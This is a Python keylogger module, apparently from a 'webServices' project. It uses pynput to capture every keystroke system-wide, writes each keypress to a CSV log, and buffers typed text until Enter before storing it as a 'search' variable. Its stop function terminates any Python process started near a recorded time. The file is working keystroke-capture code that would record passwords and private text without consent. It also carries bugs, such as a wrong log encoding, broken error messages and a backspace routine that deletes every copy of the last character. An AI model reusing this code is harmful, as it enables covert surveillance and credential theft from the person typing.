import sys
import os
sys.path.append(os.path.abspath("."))


from pynput import keyboard
import webServices.os_operation as os_operation
import psutil
import logging
import time 
from webServices.configuration import  Configuration


logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", encoding="ufc-8", level=logging.DEBUG)
logger = logging.getLogger()

FILE="key_logger.csv"
FILE = Configuration.KEY_LOGGER_SEARCH_FILE
LOGGS = "keylogger.csv"
LOGGS = Configuration.KEY_LOGGER_KEY_FILE

def _fileAdd(character: str) -> None:
    try:
        with open(FILE, "a") as file:
            file.write(character)
            file.flush()
            file.close()
    except:
        logger.error("Error opening file: {File}")

def _readFile() ->str:
    try:
        with open(FILE, "r") as file:
                string = file.read()
                file.flush()
                file.close()
        return string
    except:
        logger.error("Error opening file: {File}")
        return None
    


def _cleanFile() ->None:
    
    try:
        with open(FILE, "w") as file:
            file.flush()
            file.close()
    except:
        logger.error("Error opening file: {File}")
    
   
        
def _writeFile(string: str):
    try:
        with open(FILE, "w") as file:
            file.write(string)
            file.flush()
            file.close()
    except:
        logger.error("Error opening file: {File}")
        
    
        
def _writeLogges(string: str):
    try:
        with open(LOGGS, "a") as file:
            file.write(string)
            file.flush()
            file.close()
    except:
        logger.error("Error opening file: {LOGGS}")
  
    
def _cleanLogges():
    try:
        with open(LOGGS, "w") as file:
            file.flush()
            file.close()
    except:
        logger.error("Error opening file: {LOGGS}")    
    
        
def on_press(key):
    try:
        
        _writeLogges(f"key {key} pressed\n")
            
        if key != keyboard.Key.enter:
            
            if key == keyboard.Key.space or key == keyboard.Key.tab:
                _fileAdd(" ")
        
            elif key == keyboard.Key.backspace:
                string = _readFile()
                if len(string)>0 :
                    string = string.replace(string[-1],'')
                    _writeFile(string)
            else:
                _fileAdd(key.char)
        else:
            searchWords = _readFile()
            os_operation.addVariable("search", searchWords)   
            _cleanFile()
            
    except AttributeError:
        _writeLogges(f"key {key} pressed\n")




listener = keyboard.Listener(
    on_press=on_press)


# listener.start()

def start() -> None:
    _cleanFile()
    _cleanLogges()    
    listener.start()
    now = time.time() 
    os_operation.addVariable("key_logger", now) 
    
    logging.info("Key logger start successfully")
    
    listener.join()
    


def stop() -> None: 
    variables = os_operation.loadVariables()
    const = True
    if "key_logger" in variables:
        time = str(variables["key_logger"]).strip()
        
        for process in psutil.process_iter():
            process_time = process.create_time()
            if "python" in process.name() and process_time<= float(time)+5 and process_time>=float(time)-5:
                process.terminate()
                logging.info(f"Process -> {process} terminated successfully")
                const = False
                break
        if const:
            logging.error("Key logger has not started or is not terminated successfully")
    else: 
        logging.error("Key logger has not started")